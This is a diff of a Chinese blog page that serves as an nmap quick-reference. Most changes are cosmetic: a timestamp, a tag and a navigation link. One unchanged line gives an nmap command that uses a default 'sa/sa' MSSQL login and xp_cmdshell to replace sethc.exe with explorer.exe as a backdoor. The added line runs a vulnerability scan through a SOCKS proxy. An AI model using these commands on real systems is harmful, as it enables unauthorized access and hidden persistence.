@@ -26,7 +26,7 @@
 - Operating system version detection
 - Hardware(MAC) address dection
 - Service version dete">
-<meta property="og:updated_time" content="2016-06-20T03:02:44.258Z">
+<meta property="og:updated_time" content="2016-07-20T10:31:31.674Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="nmap 手册">
 <meta name="twitter:description" content="0x00: 说明nmap 速查手册, 总结常用用法.
@@ -101,7 +101,7 @@
 						<li>Links</li>
 						
 						
-						<li>About</li>
+						<li>Über</li>
 						
 					</ul>
 				</div>
@@ -138,7 +138,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/DDOS/" style="font-size: 10px;">DDOS</a> <a href="/tags/Destroy/" style="font-size: 10px;">Destroy</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/getshell/" style="font-size: 10px;">getshell</a> <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/python/" style="font-size: 16.67px;">python</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tar/" style="font-size: 10px;">tar</a> <a href="/tags/test/" style="font-size: 10px;">test</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/xz/" style="font-size: 10px;">xz</a> <a href="/tags/为什么/" style="font-size: 10px;">为什么</a> <a href="/tags/勿在浮沙筑高台/" style="font-size: 13.33px;">勿在浮沙筑高台</a>
+						<a href="/tags/DDOS/" style="font-size: 10px;">DDOS</a> <a href="/tags/Destroy/" style="font-size: 10px;">Destroy</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/getshell/" style="font-size: 10px;">getshell</a> <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/python/" style="font-size: 16.67px;">python</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tar/" style="font-size: 10px;">tar</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xz/" style="font-size: 10px;">xz</a> <a href="/tags/为什么/" style="font-size: 10px;">为什么</a> <a href="/tags/勿在浮沙筑高台/" style="font-size: 13.33px;">勿在浮沙筑高台</a>
 					</div>
 				</section>
 				
@@ -747,6 +747,8 @@
 </li>
 <li><p>利用mssql弱口令, 直接加后门, 避免暴露.<br>nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”copy c:\WINDOWS\explorer.exe c:\WINDOWS\system32\sethc.exe /y” target</p>
 </li>
+<li><p>加sock代理扫描<br>nmap -sS -A -v -T3 -Pn –script=vuln –proxies=socks4://127.0.0.1:1080 www.example.com</p>
+</li>
 </ul>
 <p><br></p>
 <h2 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05: Reference"></a>0x05: Reference</h2><p>原文<br><a href="http://highon.coffee/docs/nmap/" target="_blank" rel="external">http://highon.coffee/docs/nmap/</a><br><a href="http://drops.wooyun.org/tips/4333/" target="_blank" rel="external">http://drops.wooyun.org/tips/4333/</a><br><br><br>有问题找男人<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man nmap</span><br></pre></td></tr></table></figure></p>
@@ -775,11 +777,11 @@
     
 <nav id="article-nav">
   
-    <a href="/2016/05/01/hydra-menual/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/05/02/Python-列表解析/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          hydra 手册
+          Python 列表解析
         
       </div>
     </a>
